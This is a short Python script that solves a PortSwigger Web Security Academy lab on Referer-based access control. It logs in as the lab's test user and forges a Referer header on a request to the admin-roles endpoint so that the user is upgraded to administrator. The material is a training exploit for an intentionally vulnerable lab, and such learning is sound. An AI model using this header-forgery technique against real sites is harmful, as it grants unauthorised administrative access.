# Lab: Referer-based access control
# https://portswigger.net/web-security/access-control/lab-referer-based-access-control

import requests

session = requests.Session()
base_url = "https://ID.web-security-academy.net"

# Login with wiener:peter
login_data = {"username": "wiener", "password": "peter"}
response = session.post(f"{base_url}/login", data=login_data)

# upgrade to admin by including a referer header
upgrade_url = f"{base_url}/admin-roles?username=wiener&action=upgrade"
headers = {"Referer": f"{base_url}/admin"}
response = session.get(upgrade_url, headers=headers)
if "Congratulations" in response.text:
    print("Lab solved")
else:
    print("Exploit did not work")